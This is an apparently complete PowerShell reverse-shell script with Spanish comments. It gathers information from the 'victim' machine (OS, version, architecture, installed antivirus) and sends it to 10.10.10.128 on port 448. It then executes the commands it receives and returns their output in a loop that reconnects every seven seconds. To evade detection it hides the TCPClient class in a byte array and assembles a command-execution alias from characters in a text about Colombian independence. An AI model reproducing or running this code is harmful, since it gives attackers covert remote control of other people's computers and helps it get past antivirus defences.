# Funcion encargada de convertir un arreglo de bytes y lo convierte en una cadena utilizando la codificacion especificada, como UTF-8
function ConvertFrom-ByteArray {

    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Byte[]]
        $ByteArray,

        [Parameter(Position = 1)]
        [ValidateSet('ASCII', 'UTF8', 'UTF16', 'UTF32')]
        [String]
        $Encoding = 'UTF8'
    )

    if (!$ByteArray) {
        return ''
    }

    [Text.Encoding]::GetEncoding($($Encoding -replace 'UTF','UTF-')).GetString($ByteArray)
}
# final de Funcion ConvertFrom-ByteArray


while ($true) {
    # Generando valores aleatorios y codificando en Base64
    $Base64 = [Convert]::ToBase64String((1..32 | %{[byte](Get-Random -Minimum 0 -Maximum 255)}));
    $Key = ([Convert]::FromBase64String($Base64));

    # Recopilacion de informacion del equipo victima
    $System = (Get-WmiObject Win32_OperatingSystem).Caption;
    $Version = (Get-WmiObject Win32_OperatingSystem).Version;
    $Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture;
    $WindowsDirectory = (Get-WmiObject Win32_OperatingSystem).WindowsDirectory;
    $av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;
    # Configuracion de la IPAddress
    $p = "10.10.10.128"

    # Concatenacion de variables de informacion el equipo con su respectiva clave:valor
    $w = "=> RECOPILACION DE INFORMACION DEL TARGET <= `r`n System: $System`r`n VERSION: $Version`r`n ARCH: $Architecture`r`n DIRECTORY: $WindowsDirectory`r`n AVS: $av`r`n GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
    
    $s = [System.Text.ASCIIEncoding]
    [byte[]]$b = 0..65535|%{0};
    $LUNA = ConvertFrom-ByteArray  @(83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116)
    $r = "LaindependenciadeColombiaocurrienelsigloXIXcuandolascoloniasamericanaslucharoncontraelyugoespaol.LideradosporfigurascomoSimnBolvaryFranciscodePaulaSantanderlosrebeldeslograronliberaraColombiadeladominacincolonial.LaguerraferozylargaculminconlaBatalladeBoyacen1819unhitoquesellaemancipacincolombiana.EstaluchaarduamarcelnacimientodeunanacinlibreysoberanaenAmricadelSur."
    Set-Alias $r ($r[$true-11] + ($r[[byte]("0x" + "FF") -261]) + $r[[byte]("0x" + "2a") -2])
    
    # Configuracion de Puerto
    $y = New-Object $LUNA($p,448)
    $z = $y.GetStream()
    $d = $s::UTF8.GetBytes($w)
    $z.Write($d, 0, $d.Length)
    $SPARTAN = "whoami"
    $t = (LaindependenciadeColombiaocurrienelsigloXIXcuandolascoloniasamericanaslucharoncontraelyugoespaol.LideradosporfigurascomoSimnBolvaryFranciscodePaulaSantanderlosrebeldeslograronliberaraColombiadeladominacincolonial.LaguerraferozylargaculminconlaBatalladeBoyacen1819unhitoquesellaemancipacincolombiana.EstaluchaarduamarcelnacimientodeunanacinlibreysoberanaenAmricadelSur. $SPARTAN) + "@c2===> "

    while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
        $v = (New-Object -TypeName $s).GetString($b,0, $l)
        $d = $s::UTF8.GetBytes((LaindependenciadeColombiaocurrienelsigloXIXcuandolascoloniasamericanaslucharoncontraelyugoespaol.LideradosporfigurascomoSimnBolvaryFranciscodePaulaSantanderlosrebeldeslograronliberaraColombiadeladominacincolonial.LaguerraferozylargaculminconlaBatalladeBoyacen1819unhitoquesellaemancipacincolombiana.EstaluchaarduamarcelnacimientodeunanacinlibreysoberanaenAmricadelSur.  $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
        $z.Write($d, 0, $d.Length)
    }
    $y.Close()
    Start-Sleep -Seconds 7
}
